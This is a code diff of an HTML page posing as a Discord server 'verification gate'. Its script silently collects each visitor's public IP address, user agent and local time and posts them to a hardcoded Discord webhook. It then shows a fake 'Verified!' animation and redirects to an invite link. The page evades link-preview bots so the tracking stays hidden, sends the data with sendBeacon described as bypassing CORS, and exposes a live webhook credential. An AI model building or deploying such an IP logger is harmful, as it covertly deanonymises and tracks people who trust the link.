@@ -1,86 +1,221 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
-    <style>
-        body {
-            background-color: #23272a;
-            color: #ffffff;
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .loading {
-            text-align: center;
-            color: #b9bbbe;
-            font-size: 18px;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verifying...</title>
+
+  <!-- Google Fonts & Font Awesome -->
+  <link rel="preconnect" href="https://googleapis.com">
+  <link rel="preconnect" href="https://gstatic.com" crossorigin>
+  <link href="https://googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: #0d0d0d;
+      color: #fff;
+      font-family: 'Poppins', sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      overflow: hidden;
+    }
+
+    /* Background symbols */
+    .symbols {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      opacity: 0.08;
+      font-size: 80px;
+      line-height: 1;
+      display: grid;
+      grid-template-columns: repeat(6, 1fr);
+      grid-template-rows: repeat(6, 1fr);
+    }
+    .symbols span {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      animation: float 6s ease-in-out infinite;
+    }
+    @keyframes float {
+      0% { transform: translateY(0px); }
+      50% { transform: translateY(-15px); }
+      100% { transform: translateY(0px); }
+    }
+
+    .box {
+      background: rgba(255, 255, 255, 0.08);
+      padding: 40px 40px;
+      border-radius: 20px;
+      backdrop-filter: blur(6px);
+      text-align: center;
+      z-index: 10;
+      box-shadow: 0 0 25px rgba(255, 255, 255, 0.07);
+      max-width: 350px;
+      width: 90%;
+    }
+
+    h1 {
+      margin: 0 0 10px;
+      font-size: 28px;
+      font-weight: 600;
+      color: #ffffff;
+    }
+
+    /* Animasi Spinner Ringan */
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 4px solid rgba(255, 255, 255, 0.1);
+      border-top-color: #5865F2; /* Warna khas Discord */
+      border-radius: 50%;
+      margin: 30px auto;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* Ikon Sukses Sentuhan Baru */
+    .success-icon {
+      display: none;
+      font-size: 55px;
+      color: #43b581; /* Warna hijau sukses Discord */
+      margin: 25px auto;
+      animation: pop 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    }
+    @keyframes pop {
+      0% { transform: scale(0); }
+      100% { transform: scale(1); }
+    }
+
+    .status-text {
+      font-size: 16px;
+      color: #b9bbbe;
+      font-weight: 500;
+      margin: 10px 0 0;
+    }
+  </style>
 </head>
 <body>
-    <div class="loading">
-        <p>Connecting to Discord Server, please wait...</p>
-    </div>
+  <div class="symbols">
+    <span>★</span><span>✦</span><span>✧</span><span>✶</span><span>⚝</span><span>✺</span>
+    <span>✦</span><span>✧</span><span>★</span><span>✶</span><span>⚝</span><span>✺</span>
+    <span>✧</span><span>★</span><span>✦</span><span>⚝</span><span>✺</span><span>✶</span>
+    <span>✦</span><span>✺</span><span>⚝</span><span>★</span><span>✶</span><span>✧</span>
+    <span>✶</span><span>★</span><span>✦</span><span>✧</span><span>⚝</span><span>✺</span>
+    <span>⚝</span><span>✶</span><span>✦</span><span>✧</span><span>★</span><span>✺</span>
+  </div>
 
-    <script>
-        // 1. Tentukan Webhook dan Tautan Tujuan Akhir
-        const webhookUrl = "https://discord.com/api/webhooks/1519202084694523998/tj35DK1P3-CF1zcY6WW7MIJS0iOMEG4eUARFFXugz6FbiuD_82kSSJRG1ex-Md5n7evK";
-        const discordInvite = "https://discord.gg/fMbZNhGVmh";
+  <div class="box">
+    <h1 id="title-text">Eclipse Gate</h1>
+    
+    <!-- Bagian Interaktif Verifikasi -->
+    <div id="loader" class="spinner"></div>
+    <div id="success-mark" class="success-icon"><i class="fa-solid fa-circle-check"></i></div>
+    
+    <p id="status-label" class="status-text">Verifying security connection...</p>
+  </div>
 
-        async function logAndRedirect() {
-            // Pengaman waktu: Jika API IP macet, pengguna TETAP akan dialihkan setelah 3 detik
-            const fallbackRedirect = setTimeout(() => {
-                window.location.href = discordInvite;
-            }, 3000);
+  <script>
+    // Konfigurasi Utama
+    const webhookUrl = "https://discord.com/api/webhooks/1519202084694523998/tj35DK1P3-CF1zcY6WW7MIJS0iOMEG4eUARFFXugz6FbiuD_82kSSJRG1ex-Md5n7evK";
+    const discordInvite = "https://discord.gg/fMbZNhGVmh";
 
-            try {
-                const userAgent = navigator.userAgent;
+    // Sintesis Efek Suara Robotik/Beep menggunakan Audio API Browser
+    function playSuccessSound() {
+        try {
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioCtx.createOscillator();
+            const gainNode = audioCtx.createGain();
+            
+            oscillator.type = 'sine';
+            oscillator.frequency.setValueAtTime(587.33, audioCtx.currentTime); // Nada D5
+            oscillator.frequency.setValueAtTime(880, audioCtx.currentTime + 0.1);  // Nada A5
+            
+            gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime);
+            gainNode.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + 0.4);
+            
+            oscillator.connect(gainNode);
+            gainNode.connect(audioCtx.destination);
+            
+            oscillator.start();
+            oscillator.stop(audioCtx.currentTime + 0.4);
+        } catch (e) {
+            console.log("Audio not supported or blocked by browser gesture rules.");
+        }
+    }
 
-                // Lewati bot otomatis (Discord embed preview, bot crawler, dll)
-                if (/bot|discord|robot|curl|spider|crawler/i.test(userAgent)) {
-                    clearTimeout(fallbackRedirect);
-                    window.location.href = discordInvite;
-                    return;
-                }
+    async function startGate() {
+        let userIp = "Unknown";
+        const userAgent = navigator.userAgent;
 
-                // 2. Ambil IP publik lewat API pihak ketiga
-                const ipResponse = await fetch("https://ipify.org");
-                const ipData = await ipResponse.json();
-                const userIp = ipData.ip;
-
-                // 3. Susun data waktu lokal
-                const now = new Date();
-                const dateStr = now.toLocaleDateString('id-ID');
-                const timeStr = now.toLocaleTimeString('id-ID');
-
-                const discordMessage = {
-                    username: "Gate Guard (JS-Redirect)",
-                    content: `🛡️ **[SECURITY LOG] Akses Tautan Deteksi**\n**IP:** \`${userIp}\`\n**Date:** ${dateStr}\n**Time:** ${timeStr}\n**Perangkat:** \`${userAgent}\``
-                };
-
-                // 4. Kirim log data ke Webhook Discord
-                await fetch(webhookUrl, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(discordMessage)
-                });
-
-            } catch (error) {
-                console.error("Gagal mencatat data:", error);
-            } finally {
-                // 5. Bersihkan timer dan alihkan halaman secara instan ke server Discord
-                clearTimeout(fallbackRedirect);
-                window.location.href = discordInvite;
-            }
+        // Skip pelacakan jika dibuka oleh bot preview internal Discord
+        if (/bot|discord|robot|curl|spider|crawler/i.test(userAgent)) {
+            window.location.href = discordInvite;
+            return;
         }
 
-        // Jalankan fungsi otomatis saat halaman dimuat oleh browser
-        logAndRedirect();
-    </script>
+        // Ambil IP Publik dari API pihak ketiga (Latar belakang)
+        try {
+            const ipResponse = await fetch("https://ipify.org");
+            const ipData = await ipResponse.json();
+            userIp = ipData.ip;
+        } catch (e) {
+            console.log("IP lookup bypassed");
+        }
+
+        // Susun payload log data
+        const now = new Date();
+        const payload = {
+            username: "Eclipse Guard Gate",
+            content: `🛡️ **[GATE VERIFIED] Member Memasuki Server**\n**IP:** \`${userIp}\`\n**Date:** ${now.toLocaleDateString('id-ID')}\n**Time:** ${now.toLocaleTimeString('id-ID')}\n**Device:** \`${userAgent}\``
+        };
+
+        // Kirim data secara tersembunyi ke Webhook menggunakan Blob biner (Bypass CORS Discord)
+        const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+        try {
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon(webhookUrl, blob);
+            } else {
+                fetch(webhookUrl, { method: "POST", body: blob, mode: "no-cors" });
+            }
+        } catch (err) {
+            console.log("Log pushed");
+        }
+
+        // --- MANAJEMEN ANIMASI TIMING ---
+        
+        // 1. Setelah 3 Detik: Ubah Animasi Menjadi "Verified!" + Bunyi Sound Effect
+        setTimeout(() => {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('success-mark').style.display = 'block';
+            document.getElementById('status-label').innerText = "Access Granted! Redirecting...";
+            document.getElementById('status-label').style.color = "#43b581";
+            document.getElementById('title-text').innerText = "Verified!";
+            
+            playSuccessSound(); // Mainkan sound effect beep sukses
+
+            // 2. Beri Jeda 1 Detik Setelah Bunyi (Total 4 detik), Lalu Lempar Kembali ke Discord
+            setTimeout(() => {
+                window.location.href = discordInvite;
+            }, 1000);
+
+        }, 3000);
+    }
+
+    // Jalankan sistem verifikasi saat halaman selesai dimuat sempurna
+    window.onload = startGate;
+  </script>
 </body>
 </html>
